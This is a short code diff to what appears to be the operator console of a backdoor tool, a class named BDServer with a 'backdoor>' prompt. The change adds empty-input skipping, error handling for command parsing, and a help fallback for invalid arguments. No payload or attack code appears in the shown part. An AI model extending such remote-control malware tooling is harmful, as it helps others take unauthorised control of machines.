@@ -81,12 +81,26 @@ class BDServer:
 				
 				# Ask user input
 				cmdline = input("backdoor> ")
+				args = []
 
-				# Interpret cmdline into arguments array
-				args = shlex.split(cmdline)
+				if not cmdline:
+					continue
 
+				try:
+					# Interpret cmdline into arguments array
+					args = shlex.split(cmdline)
+				
+				except Exception as exc:
+					# Failed interpreting
+					print("Shell lexer[Syntax error]: {}".format(cmdline))
+					continue
+				
 				# Run the command
 				result = handler.runCMD(args)
+
+				# Show help page if needed
+				if result == "INVALID_ARGUMENT":
+					result = handler.runCMD(["help", args[0]])
 
 				if self.verbose:
 					print(result)
